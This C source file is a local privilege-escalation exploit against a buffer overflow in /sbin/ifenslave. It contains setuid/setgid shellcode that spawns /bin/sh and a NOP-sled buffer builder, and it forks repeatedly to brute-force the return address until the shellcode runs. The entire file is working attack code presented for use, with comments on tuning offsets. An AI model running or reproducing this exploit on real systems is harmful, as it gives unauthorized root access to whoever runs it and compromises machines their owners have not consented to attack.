#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/wait.h>

static char shellcode[]=
"\x31\xc0\x31\xdb\xb0\x17\xcd\x80"
"\xb0\x2e\xcd\x80\xeb\x15\x5b\x31"
"\xc0\x88\x43\x07\x89\x5b\x08\x89"
"\x43\x0c\x8d\x4b\x08\x31\xd2\xb0"
"\x0b\xcd\x80\xe8\xe6\xff\xff\xff"
"/bin/sh";

#define NOP     0x90

// First ret, from which we'll start.
// Here it is taken from gdb
#define RET     0xbffff687


int main(int argc, char **argv)
{
	int x=0, status, i;
	int offset=20; // <- positive.
	char buffer[1000];
	long retaddr;
	pid_t pid;

	retaddr=RET+offset;
	printf("\n[+] 0dd ifenslave local root xpl ;D\n\n");
	printf("[~] Trying offset %d, addr 0x%x\n",x, retaddr);
	// 300 - maximum number, which can be added to RET.
	// I have taken a small one, for debug. In real cases it can be about 100 times larger
	while(x<=300)
	{
		//creating child process
		if((pid=fork())==0)
		{

		 /* Child */

			// childe generates new exploit buffer with new retaddr.
			for (i=0;i<200;i+=4) {
				*(long *)&buffer[i] = retaddr;
			}
			for (i=0;i<100;i++) {
				buffer[i+200] = NOP;
			}
			for (i=0;i<strlen(shellcode);i++) {
				buffer[i+300] = shellcode[i];
			}
			// executing ifenslave - trying to exploit bof
			execl("/sbin/ifenslave","/sbin/ifenslave",buffer,NULL); //

		/* END */

		}
		// while child tries to exploit vulnerability in ifenslave, parent waits while it ends.
		// And signal, which child will send after it ends, will be placed in status variable.
		wait(&status);
		// Displaying the received signal. Just for debugging.
		printf("[~] Received signal: #%i\n", status);
		// Checking. If signal is zero (0), then child was finished without erros, it means, that after
		// overflowing ifenslave has continued to work - shellcode was executed or you have got into cs :)
		// (though it's almost impossible), so we have no reason to continue bruteforcing.
		if(WIFEXITED(status) != 0 ) {
			printf("[+] Retaddr guessed: 0x%x\n[~] Exiting...\n", retaddr);
			exit(1);
		} else {
		// If signal isn't zero, than we have some errors (SIGSEGV, SIGILL)...
		// Adding offset to x and retaddr and repeating a loop: creating child process, which tries
		// to get shell with a new buffer, waiting for him, checking signal,...:)
			retaddr+=offset;
        		x+=offset;
			printf("[~] Trying offset %d, addr 0x%x\n",x, retaddr);
		}
	}
}

